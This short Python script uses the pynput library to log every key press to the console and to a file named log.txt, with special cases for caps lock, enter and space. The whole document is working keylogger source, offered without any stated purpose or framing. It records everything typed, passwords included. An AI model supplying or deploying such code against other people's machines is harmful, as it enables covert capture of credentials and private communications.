from pynput import keyboard

def logger(key):
    print(key)
    with open('log.txt', 'a') as output:
        match key:
            case keyboard.Key.caps_lock:
                output.write(' [CAPS LOCK] ')
            case keyboard.Key.enter:
                output.write('\n')
            case keyboard.Key.space:
                output.write(' ')
            case _:
                try:
                    output.write(key.char)
                except:
                    output.write(f'Error, key pressed: {key}\n')

listener = keyboard.Listener(on_press=logger)
listener.start()
input()
